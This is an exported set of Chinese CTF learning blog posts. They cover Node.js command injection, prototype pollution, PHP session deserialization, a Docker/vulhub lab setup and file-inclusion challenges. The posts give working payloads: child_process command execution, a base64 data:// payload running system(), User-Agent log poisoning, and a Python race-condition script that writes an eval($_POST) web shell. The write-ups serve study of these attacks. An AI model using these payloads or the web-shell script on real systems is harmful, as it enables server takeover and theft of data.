    <url>/2024/03/11/node-js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
    <content><![CDATA[<h1 id="好东西"><a href="#好东西" class="headerlink" title="好东西"></a>好东西</h1><span id="more"></span>

<h1 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h1><p>原型链污染其实就是围绕着两个属性做文章</p>
<p>属性<code>__proto__</code></p>
<p>属性<code>prototype</code></p>
<h2 id="从用法角度介绍"><a href="#从用法角度介绍" class="headerlink" title="从用法角度介绍"></a>从用法角度介绍</h2><p>试想一些通用的方法，我们是如何调用的呢，如<code>toString()</code></p>
<p>我们在nodejs命令执行中写过一个</p>
<p>payload:eval&#x3D;require(‘child_process’).spawnSync(‘tac’,[‘fl001g.txt’]).stdout.toString()</p>
<p>那时我上官网文档里查看了一下child_process类中并没有toString()方法</p>
<p>那它哪来的呢？</p>
<h2 id="proto-和prototype"><a href="#proto-和prototype" class="headerlink" title="__proto__和prototype"></a><code>__proto__</code>和prototype</h2><p>首先这两都是属性，都是默认内置在每个对象当中</p>
<p>prototype指向一个原型对象，这个对象很基础，包含了很多通用的方法和属性，比如刚刚的<code>toString()</code></p>
<p><code>__proto__</code>则指向object.prototype，实际上也是指向原型对象</p>
<p>问题还没解答，那toString()怎么用的呢?</p>
<p>这就要说一下prototype的一些机制，当调用一个对象中的属性和方法时，先是在对象中寻找，若有则用，若无则去prototype指向的原型的对象中去找.</p>
<p>以下为实验</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240311164432778.png"  alt="image-20240311164432778"></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240311164445047.png"  alt="image-20240311164445047"></p>
<p>可见b对象虽为空，但还是输出了go中的2</p>
<p>到这里理论已经形成，下面看看实战</p>
<h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><h1 id="web338"><a href="#web338" class="headerlink" title="web338"></a>web338</h1><p>题目给了源码，快进到路由中的login.js</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240311165617963.png"  alt="image-20240311165617963"></p>
<p>要求:让secert(作者是故意还是不小心打错的)中的ctfshow等于36dboy即可输出flag</p>
<p>很容易就想到了原型链污染，在原型对象中注入一个ctfshow:36dboy即可</p>
<p>那注入点在哪？</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240311170233201.png"  alt="image-20240311170233201"></p>
<p>这里搞了个什么处理，打开utils中的common.js康康</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240311170337591.png"  alt="image-20240311170337591"></p>
<p>真是炸炸又刚刚啊，简单介绍一下就是把我们写入的数据copy到了user对象中</p>
<p>详细解释:</p>
<p>1.传入两个对象，一个是user,一个是req.body,req.body由我们所控</p>
<p>2.定义一个key不断读取req.body中的键名</p>
<p>3.如果这个键名在user中存在，则继续调用copy，如果不存在则在则让user创建一个和key同名的键名，并且存储和req.body中相同的键值</p>
<p>4.key读完了自动就跳出循环了</p>
<p>抓个包看看它咋写</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240311171328658.png"  alt="image-20240311171328658"></p>
<p><code>payload:&#123;&quot;__proto__&quot;:&#123;&quot;ctfshow&quot;:&quot;36dboy&quot;&#125;&#125;</code></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240311172433837.png"  alt="image-20240311172433837"></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240311172445135.png"  alt="image-20240311172445135"></p>
<p>带出来了</p>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title>nodejs-ctfshow</title>
    <url>/2024/03/02/nodejs-ctfshow/</url>
    <content><![CDATA[<h1 id="CTFSHOW"><a href="#CTFSHOW" class="headerlink" title="CTFSHOW"></a>CTFSHOW</h1><span id="more"></span>

<h1 id="web334"><a href="#web334" class="headerlink" title="web334"></a>web334</h1><p>给了两个源码文件和一个登录界面</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240303111933863.png"  alt="image-20240303111933863"></p>
<p>前端可以看到的，以post数据提交用户名和密码，以json格式接受返回数据</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240303112015481.png"  alt="image-20240303112015481"></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240303112028812.png"  alt="image-20240303112028812"></p>
<p>这里给了用户名和密码，然后看了一下登录检验</p>
<p>用户名不能为CTFSHOW，输入的用户名会经过<code>toUpperCase()</code>转化为大写后与数据比较，密码正常比较。</p>
<p>既然会转化为大写，直接输入ctfshow(小写)即可</p>
<h1 id="web335"><a href="#web335" class="headerlink" title="web335"></a>web335</h1><p>题面</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240303124252606.png"  alt="image-20240303124252606"></p>
<p>信息收集</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240303124304897.png"  alt="image-20240303124304897"></p>
<p>抓包扫描后无果</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240303124335586.png"  alt="image-20240303124335586"></p>
<p>传入eval&#x3D;1，出现回显，推测为console.log(传参)，反正能执行我的命令并且输出</p>
<p>在nodejs中执行系统命令我们主要是使用child_process类</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240304175348635.png"  alt="image-20240304175348635"></p>
<p>可以看到这里有很多方法，有同步和异步创建进程的分类，我们这里需要的是异步创建进程，这里还不是很理解为什么同步创建进程不会有回显(大概是因为主程序没结束，子进程没有执行？)</p>
<p>先看<code>execSync()</code></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240304180214603.png"  alt="image-20240304180214603"></p>
<p>官方文档看得不是很懂，希望以后有机会研读</p>
<p>总之应对这题，只需要一个参数command足以</p>
<p>payload:eval&#x3D;require(‘child_process’).execSync(‘ls’)</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240304180415820.png"  alt="image-20240304180415820"></p>
<p>发现flag文件，改命令查看即可</p>
<h1 id="web336"><a href="#web336" class="headerlink" title="web336"></a>web336</h1><p>这题相比上题，ban掉了exec，所以我们用另一个spawn</p>
<h2 id="第一种方法spwanSync"><a href="#第一种方法spwanSync" class="headerlink" title="第一种方法spwanSync()"></a>第一种方法spwanSync()</h2><p>payload1:<code>eval=require(&#39;child_process&#39;).spawnSync(&#39;ls&#39;).stdout.toString()</code></p>
<p>payload2:<code>eval=require(&#39;child_process&#39;).spawnSync(&#39;tac&#39;,[&#39;fl001g.txt&#39;]).stdout.toString()</code></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240305181344645.png"  alt="image-20240305181344645"></p>
<p>学习一下<code>spawnSync()</code>方法</p>
<p><code>spawnSync()</code>会同步创建一个子进程执行我们传入的命令，并且返回一个对象.</p>
<h3 id="传入命令"><a href="#传入命令" class="headerlink" title="传入命令"></a>传入命令</h3><p>第一个参数是命令的名称</p>
<p>第二个参数是一个数组，用来传递命令的参数</p>
<h3 id="返回的对象"><a href="#返回的对象" class="headerlink" title="返回的对象"></a>返回的对象</h3><p>返回的这个对象包含命令执行后的信息</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240305182634001.png"  alt="image-20240305182634001"></p>
<p>这里我们需要的是标准输出流stdout，并用toString()将它转化为字符串即可输出</p>
<h2 id="第二种方法-fs类"><a href="#第二种方法-fs类" class="headerlink" title="第二种方法 fs类"></a>第二种方法 fs类</h2><h3 id="两个魔术变量"><a href="#两个魔术变量" class="headerlink" title="两个魔术变量"></a>两个魔术变量</h3><p>__filename:返回当前模块文件被解析过后的绝对路径</p>
<p>__dirname:返回当前模块文件解析后所在的文件夹的绝对路径</p>
<h3 id="readdirSync和readFileSync"><a href="#readdirSync和readFileSync" class="headerlink" title="readdirSync和readFileSync"></a>readdirSync和readFileSync</h3><p>payload1:<code>eval=require(&#39;fs&#39;).readdirSync(&#39;.&#39;)</code>查看当前目录下的文件</p>
<p>payload2:<code>eval=require(&#39;fs&#39;).readFileSync(&#39;fl001g.txt&#39;,&#39;utf-8&#39;)</code>查看文件</p>
<h3 id="exec绕过"><a href="#exec绕过" class="headerlink" title="exec绕过"></a>exec绕过</h3><p>payload:?<code>eval=require(&#39;child_process&#39;)[&#39;exe&#39;+&#39;cSync&#39;](&#39;ls&#39;).toString()</code></p>
<p>这里有个疑点，如果我想读取上一层目录的文件该如何处理,以后再想吧</p>
<h1 id="web337"><a href="#web337" class="headerlink" title="web337"></a>web337</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240305201256890.png"  alt="image-20240305201256890"></p>
<p>要求，传入两个数ab</p>
<p>1.a的长度和b的长度一致</p>
<p>2.a不等于b</p>
<p>3.md5编码后的a+flag和b+flag相等</p>
<h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>这里我们的payload为a[]&#x3D;1&amp;b[]&#x3D;1</p>
<p>1.数组.length即数组元素个数，满足相等</p>
<p>2.JavaScript会比较等号两边数组的地址，弱不一样直接返回false(但是php不会)</p>
<p>3.上本地测试图</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240305202533805.png"  alt="image-20240305202533805"></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240305202543607.png"  alt="image-20240305202543607"></p>
<p>ok了</p>
<p>再看看如果数组里面有两个元素呢</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240305202622579.png"  alt="image-20240305202622579"></p>
<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>payload:a[‘x’]&#x3D;1&amp;b[‘x’]&#x3D;1</p>
<p>原理与上差不多相同，不过输出的东西不太同</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240305203029034.png"  alt="image-20240305203029034"></p>
<h1 id="web338"><a href="#web338" class="headerlink" title="web338"></a>web338</h1><p>原型链污染</p>
<p>移步下一篇文章</p>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>入门</tag>
        <tag>ctfshow</tag>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title>php_Session反序列化学习</title>
    <url>/2024/02/25/php-Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="php反序列化的一种"><a href="#php反序列化的一种" class="headerlink" title="php反序列化的一种"></a>php反序列化的一种</h1><span id="more"></span>

<h1 id="从开发者角度认识session"><a href="#从开发者角度认识session" class="headerlink" title="从开发者角度认识session"></a>从开发者角度认识session</h1><h2 id="为什么需要session"><a href="#为什么需要session" class="headerlink" title="为什么需要session"></a>为什么需要session</h2><p>由于http协议是无状态的，所以我们需要一种基于http的技术让服务器识别用户的状态，以达到防护，提供用户个性化资源，记录用户操作等目的</p>
<h1 id="session一些特性"><a href="#session一些特性" class="headerlink" title="session一些特性"></a>session一些特性</h1><p>相比于cookie，session主要由sessionid和它所带的值组成，而session存储在客户端和服务端两端，客户端只存储sessionid，服务端两个都存。</p>
<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>如果我想通过session实现一个功能——当用户登录时，页面会显示”你好!xxx”</p>
<p>简单写个前后端</p>
<p>注册</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240225184635095.png"  alt="image-20240225184635095"></p>
<p>填入后可以看到在tem目录下的session文件</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240225184701936.png"  alt="image-20240225184701936"></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240225184712646.png"  alt="image-20240225184712646"></p>
<p>登录</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240225185914591.png"  alt="image-20240225185914591"></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240225185932722.png"  alt="image-20240225185932722"></p>
<p>我们就实现了这个功能</p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>前面提到用户的输入会以序列化的形式存储在session中，php给我们提供了三种处理引擎，由<code>session.serialize_handler</code>来设置</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240226152937389.png"  alt="image-20240226152937389"></p>
<h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><p>存储格式:键名+竖线+经过<code>serialize()</code>函数序列化处理的值</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240226152654358.png"  alt="image-20240226152654358"></p>
<p>这里竖线前面的user是<code>$_SESSION[&#39;user&#39;]</code>里的user，竖线后面的user是类名</p>
<h3 id="php-binary"><a href="#php-binary" class="headerlink" title="php_binary"></a>php_binary</h3><p>键名的长度对应的ASCII字符+键名+经过<code>serialize()</code>函数序列化处理的值</p>
<p>对比上面的php其实也就多个ASCII字符,少个竖线</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240226153657091.png"  alt="image-20240226153657091"></p>
<p>为了更直观，我把键名写到33个字符，33对应的ASCII字符为!</p>
<h3 id="php-serialize"><a href="#php-serialize" class="headerlink" title="php_serialize"></a>php_serialize</h3><p>经过<code>serialize()</code>函数序列化处理的__数组__</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240226154036903.png"  alt="image-20240226154036903"></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240226154420821.png"  alt="image-20240226154420821"></p>
<p>a表示的是SESSION数组中有几个元素，花括号里包括序列化后的数据，这里的键名也需要<code>s::;</code>的表达</p>
<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>当两个文件所用的处理器不相同时，且SESSION数组内的值可控时，我们就可以构造恶意数据来进行操作</p>
<h3 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h3><p>我在注册这边使用的是php_binary处理器，登录那边用的是php处理器</p>
<p>注册这边它的用户名，和密码都是可控的，如果我们正常输入，它会这样存入</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240226161914641.png"  alt="image-20240226161914641"></p>
<p>我们就可以在username的属性动一些手脚达到改属性的目的，这里把Ewoji改为了Emoji</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240226164258514.png"  alt="image-20240226164258514"></p>
<p>之后再打开登录文件</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240226162151930.png"  alt="image-20240226162151930"></p>
<p>修改成功</p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>这里是由|产生了歧义，php处理器把|后面的东西当作对象反序列化了</p>
<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="CTFSHOW-web-263"><a href="#CTFSHOW-web-263" class="headerlink" title="CTFSHOW web-263"></a>CTFSHOW web-263</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240226164651595.png"  alt="image-20240226164651595"></p>
<p>题面，看源码，抓包无果，直接开扫</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240226164731869.png"  alt="image-20240226164731869"></p>
<p><a class="link"   href="http://www.zip,下载,打开/" >www.zip,下载，打开<i class="fas fa-external-link-alt"></i></a></p>
<p>发现漏洞点</p>
<p>1.写入SESSION:原本用来记录limit的值可以修改</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240226185421699.png"  alt="image-20240226185421699"></p>
<p>2.写入文件:<code>file_put_contents()</code>,这里的意思是用用户输入的username为一个log-xxx的日志文件命名，写入的内容password可以用反序列修改，这就可以直接写马</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240226185527715.png"  alt="image-20240226185527715"></p>
<p>3.触发反序列化，这里的&#x2F;inc&#x2F;inc.php是不可访问的，但是check.php没有禁止访问而且它包含了inc.php，访问check.php即可触发反序列化</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240226185757295.png"  alt="image-20240226185757295"></p>
<p>最后的payload如下 :</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240226185841358.png"  alt="image-20240226185841358"></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240226185855523.png"  alt="image-20240226185855523"></p>
<p>然后连接读取flag即可</p>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>入门</tag>
        <tag>php反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>使用kali-linux和docker搭建漏洞复现平台日记</title>
    <url>/2024/03/11/%E4%BD%BF%E7%94%A8kali-linux%E5%92%8Cdocker%E6%90%AD%E5%BB%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%B9%B3%E5%8F%B0%E6%97%A5%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="其实早就想弄这个了，老是忘了，这次队长布置了任务就做了吧"><a href="#其实早就想弄这个了，老是忘了，这次队长布置了任务就做了吧" class="headerlink" title="其实早就想弄这个了，老是忘了，这次队长布置了任务就做了吧"></a>其实早就想弄这个了，老是忘了，这次队长布置了任务就做了吧</h3><span id="more"></span>

<h1 id="kali-linux优化"><a href="#kali-linux优化" class="headerlink" title="kali-linux优化"></a>kali-linux优化</h1><p>刚刚开始下的时候可卡了，输入老是有延迟，用的很不爽</p>
<h2 id="掉帧问题"><a href="#掉帧问题" class="headerlink" title="掉帧问题"></a>掉帧问题</h2><p><a class="link"   href="https://zhuanlan.zhihu.com/p/265868395" >解决VMware运行卡顿的问题 - 知乎 (zhihu.com)<i class="fas fa-external-link-alt"></i></a></p>
<p>亲测有效</p>
<h2 id="num-lock问题"><a href="#num-lock问题" class="headerlink" title="num lock问题"></a>num lock问题</h2><p>鼠标在虚拟机和主机切换的时候老是跳</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240311225635342.png"  alt="image-20240311225635342"></p>
<p>其实是因为主机和虚拟机的lock状态不同，摁数字上面的那个num跳成一致即可</p>
<h1 id="下载docker和vulhub"><a href="#下载docker和vulhub" class="headerlink" title="下载docker和vulhub"></a>下载docker和vulhub</h1><p>sudo apt-get install docker.io</p>
<p>sudo apt-get install python3-pip</p>
<p>sudo apt-get install docker-compose</p>
<p>git clone <a class="link"   href="https://github.com/vulhub/vulhub.git" >https://github.com/vulhub/vulhub.git<i class="fas fa-external-link-alt"></i></a></p>
<p>这里出现了好多报错，耐心排查，收集资料</p>
<h1 id="docker一些小知识"><a href="#docker一些小知识" class="headerlink" title="docker一些小知识"></a>docker一些小知识</h1><p>这里有几个概念，仓库，tar包，dockerfile，容器</p>
<p>我们要记住这四个东西都是为一个东西——镜像服务的即可</p>
<p>镜像是什么，镜像就是一个巨大的压缩文件，它可以把很多东西压缩在里面，比如一些系统环境啥的</p>
<h2 id="仓库"><a href="#仓库" class="headerlink" title="仓库"></a>仓库</h2><p>用来存储镜像的地方</p>
<p><code>docker pull</code>将镜像从仓库拉出来</p>
<p><code>docker push</code>将镜像推进仓库</p>
<h2 id="tar包"><a href="#tar包" class="headerlink" title="tar包"></a>tar包</h2><p>tar是镜像的压缩，通过指令可以解压和打包</p>
<p><code>docker save</code>把镜像打成tar包</p>
<p><code>docker load</code>把tar包解药为镜像</p>
<h2 id="dockerfile"><a href="#dockerfile" class="headerlink" title="dockerfile"></a>dockerfile</h2><p>由于dockerfile的语法我不是很懂</p>
<p>这里只知道dockerfile可以在编辑后通过<code>docker build</code>建成一个镜像文件</p>
<h2 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h2><p>容器就是容纳镜像解压出来后的所有东西，它容下了所有的配置，代码啥的</p>
<p>我们就可以直接访问这个容器得到所得的服务</p>
<p><code>docker run -dit -p 100:80 --name ewoji</code>启动容器–参数-d表示在后台运行，-p表示端口映射如100:80（前是内网后是外网）–name 给你的容器取名 -t开个可互动的bash -i标准输出回本机</p>
<p><code>docker commit</code>容器在改动后还可以再压缩回镜像</p>
<p><code>docker exec -it yourname bash </code>进入容器的终端进行控制 exit退出 </p>
<p><code>docker ps</code>查看已经开启的容器的信息</p>
<h2 id="docker-compose"><a href="#docker-compose" class="headerlink" title="docker-compose"></a>docker-compose</h2><p>docker-compose就是掌管多个容器相互通信的东西</p>
<p>多个容器通过一张docker网卡来实现ip地址的分配，容器之间可以直接curl+ip来获取另一容器的数据，本地则通过网卡路由来与容器交换信息（一般在创建容器的时候要分配好域名，不然又要到容器上看host文件）</p>
<p><code>docker run -dit --link ewoji:ewoji --name eowji</code>把另一个容器ewoji映射到本容器，其实就是修改host文件</p>
<p>之后就直接curl ewoji就好了</p>
<p>既然这样那还用docker-compose干嘛呢，试想如果有三个容器，一个nginx，一个php，一个mysql，用户通过80端口使用NGINX服务，那么Nginx容器必然要用link链接php，而php又要链接mysql，而且创建容器的顺序还必须先从mysql开始，不然php就无法配置链接</p>
<p>那么有没有一种可能，就是我们把配置文件统一掌管，可以实时修改呢，那就是docker-compose</p>
<p>等于一个统一部署吧</p>
<h3 id="docker-compose-yml"><a href="#docker-compose-yml" class="headerlink" title="docker-compose.yml"></a>docker-compose.yml</h3><p><img   src="/../img/$%7Bfiilename%7D/image-20240312181044240.png"  alt="image-20240312181044240"></p>
<p>可见这里做了配置文件和根目录的映射</p>
<p><code>docker-compose up -d</code>这样就开始拉取镜像了 </p>
<h1 id="使用vulhub中的靶场"><a href="#使用vulhub中的靶场" class="headerlink" title="使用vulhub中的靶场"></a>使用vulhub中的靶场</h1><p>ls vulhub</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240312174132393.png"  alt="image-20240312174132393"></p>
<p>这里有很多，选个认识的<code>cd vulhub/weblogic/CVE-2018-2894</code>,<code>docker run -d up</code>这里实际上就是集成了<code>docker run</code>和<code>docker-compose up -d</code></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240312181853731.png"  alt="image-20240312181853731"></p>
<p>看到已经启动了，再访问本地ip和你映射的端口即可</p>
<p><code>docker stop &lt;id or name&gt;</code>关闭容器</p>
<p><code>docker rm &lt;id or name&gt;</code>删除容器，记得先关闭再删除</p>
<h1 id="使用本地的镜像文件搭建靶场"><a href="#使用本地的镜像文件搭建靶场" class="headerlink" title="使用本地的镜像文件搭建靶场"></a>使用本地的镜像文件搭建靶场</h1><p>下载好的五题</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240312195458969.png"  alt="image-20240312195458969"></p>
<p>进入哪个rd都可以，看见里面有Dockerfile文件，在这里打开终端</p>
<p><code>docker build -t name .</code>特别注意后面的那个点代表当前目录</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240312195639419.png"  alt="image-20240312195639419"></p>
<p>可以看见已经拉成镜像了</p>
<p>接着这里应该是没有弄docker-compose.yml吧那就两个直接run就好了</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240312205525422.png"  alt="image-20240312205525422"></p>
<h1 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h1><p>如果要用宿主机来访问容器来进行抓包等操作的话，我们需要借助kali的虚拟网卡，只需在宿主机powershell加入一下命令即可</p>
<p>若不知道kali的虚拟网卡,ifconfig就可以查看</p>
<p>route add -P docker网段 mask 255.255.255.0 虚拟机IP</p>
]]></content>
      <categories>
        <category>复现</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>工具</tag>
        <tag>复现</tag>
      </tags>
  </entry>
  <entry>
    <title>文件包含漏洞</title>
    <url>/2024/03/13/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>开</p>
<span id="more"></span>

<h1 id="web-79"><a href="#web-79" class="headerlink" title="web 79"></a>web 79</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240313101524315.png"  alt="image-20240313101524315"></p>
<p><code>file=data://plain/text,&lt;?= &#39;tac flag.php&#39;?&gt;</code><?echo 1?>等于<?= 1?>,需要打开short_open_tag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=</span><br><span class="line">PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs ===&gt; &lt;?php system(&#x27;cat flag.php&#x27;);</span><br></pre></td></tr></table></figure>

<h1 id="web-80"><a href="#web-80" class="headerlink" title="web 80"></a>web 80</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240313111931278.png"  alt="image-20240313111931278"></p>
<p>新姿势，包含目录文件</p>
<p>目录文件会记录我们的ua，浏览器的一些信息，那我们在ua插入php代码，再让include包含并执行，就可以getshell，先包含</p>
<p>Nginx:&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p>
<p>Apache:&#x2F;var&#x2F;log&#x2F;apache&#x2F;access.log</p>
<p>或许还可以试试有没有error.log</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240313111318671.png"  alt="image-20240313111318671"></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240313111708459.png"  alt="image-20240313111708459"></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240313111721356.png"  alt="image-20240313111721356"></p>
<p>得吃</p>
<p>当然你也可以让file包含你服务器的木马文件，然后直接上线它的服务器也可以</p>
<h1 id="web-81"><a href="#web-81" class="headerlink" title="web 81"></a>web 81</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240313111952192.png"  alt="image-20240313111952192"></p>
<p>多过滤了一个:</p>
<p>和上题一样，不能请求自己服务器的木马而已</p>
<h1 id="web-82-86"><a href="#web-82-86" class="headerlink" title="web 82-86"></a>web 82-86</h1><p><a href="https://blog.csdn.net/qq_46918279/article/details/120106832">CTFSHOW-文件包含_highlight_file(<strong>file</strong>);-CSDN博客</a></p>
<p>进行一个新知识的学</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"> </span><br><span class="line">url=<span class="string">&#x27;http://08d4a04e-19b3-4049-8a81-e9c6226eee2f.challenge.ctf.show:8080/&#x27;</span></span><br><span class="line"><span class="comment">#设置PHPSESSID的值</span></span><br><span class="line">sessionid=<span class="string">&#x27;ctfshow&#x27;</span>     </span><br><span class="line">data=&#123;<span class="string">&quot;1&quot;</span>:<span class="string">&quot;file_put_contents(&#x27;/var/www/html/tao.php&#x27;,&#x27;&lt;?php eval($_POST[2]);?&gt;&#x27;);&quot;</span>&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">#为了进行条件竞争，需要一边写一边读</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#进行上传文件时需要post传递名为PHP_SESSION_UPLOAD_PROGRESS值为一句话木马</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">	fileBytes = io.BytesIO(<span class="string">b&#x27;a&#x27;</span>*<span class="number">1024</span>*<span class="number">50</span>)          <span class="comment">#生产一个50k的文件</span></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		response=session.post(url,</span><br><span class="line">			data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>&#125;,</span><br><span class="line">			cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid&#125;,</span><br><span class="line">			files=&#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;ctfshow.jpg&#x27;</span>,fileBytes)&#125;    <span class="comment">#设置文件名字和内容</span></span><br><span class="line">			)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">#读取session文件，这里文件为/tmp/sess_ctfshow</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		response=session.post(url+<span class="string">&#x27;?file=/tmp/sess_&#x27;</span>+sessionid,data=data)</span><br><span class="line">		response2=session.get(url+<span class="string">&#x27;tao.php&#x27;</span>);</span><br><span class="line">		<span class="keyword">if</span> response2.status_code==<span class="number">200</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;++++++++++++++++++++&#x27;</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="built_in">print</span>(response2.status_code)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"> </span><br><span class="line">	<span class="comment">#开启多线程进行竞争	</span></span><br><span class="line">	evnet=threading.Event()</span><br><span class="line">	<span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:			</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">			threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">			threading.Thread(target=read,args=(session,)).start()</span><br><span class="line">	evnet.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>



<h1 id="web-87"><a href="#web-87" class="headerlink" title="web 87"></a>web 87</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240316125758740.png"  alt="image-20240316125758740"></p>
<p>这题目的是写入木马，并成功执行木马</p>
<p>分析一波:</p>
<p>这里的文件名中不能有php，data，：，.</p>
<p>并且木马写上去后还会先执行死亡程序，不会执行木马</p>
<p>该怎么做</p>
<p>先要了解一下<code>php://filter/write=convert.base64-decode/resouce=flag.php</code></p>
